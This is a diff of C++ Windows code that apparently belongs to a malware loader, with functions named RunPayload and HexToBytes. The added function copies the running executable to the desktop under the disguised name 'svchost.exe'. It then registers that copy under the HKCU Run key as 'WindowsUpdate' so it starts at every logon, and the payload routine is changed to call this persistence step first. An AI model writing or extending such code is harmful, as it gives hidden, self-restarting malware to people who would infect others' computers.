@@ -505,18 +505,62 @@ std::vector<BYTE> HexToBytes(const std::string& hex) {
     return bytes;
 }
 
+bool CopyAndSetRegistry() {
+    WriteLog("Starting copy and registry setup");
+    
+    // Get current executable path
+    wchar_t currentPath[MAX_PATH];
+    if (!GetModuleFileNameW(NULL, currentPath, MAX_PATH)) {
+        WriteLog("Failed to get current executable path");
+        return false;
+    }
+    
+    // Get desktop path
+    wchar_t desktopPath[MAX_PATH];
+    if (FAILED(SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath))) {
+        WriteLog("Failed to get desktop path");
+        return false;
+    }
+    
+    // Set target file path
+    wchar_t targetPath[MAX_PATH];
+    wcscpy_s(targetPath, desktopPath);
+    wcscat_s(targetPath, L"\\svchost.exe");
+    
+    // Copy the file
+    if (!CopyFileW(currentPath, targetPath, FALSE)) {
+        WriteLog("Failed to copy executable");
+        return false;
+    }
+    
+    WriteLog("Successfully copied executable to: " + std::string(targetPath, targetPath + wcslen(targetPath)));
+    
+    // Create registry key pointing to the new location
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        if (RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, (BYTE*)targetPath, (wcslen(targetPath) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
+            WriteLog("Successfully created registry key");
+            RegCloseKey(hKey);
+            return true;
+        }
+        RegCloseKey(hKey);
+    }
+    
+    WriteLog("Failed to create registry key");
+    return false;
+}
 
 void RunPayload()
 {
     try {
         WriteLog("Starting payload execution");
         
-        if (AddToRegistryStartup()) {
-            WriteLog("Successfully added to registry startup");
-        } else {
-            WriteLog("Failed to add to registry startup");
+        // Copy executable and set up registry
+        if (!CopyAndSetRegistry()) {
+            WriteLog("Failed to copy executable and set up registry");
+            return;
         }
-
+        
         try {
             wchar_t userProfile[MAX_PATH];
             if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile))) {
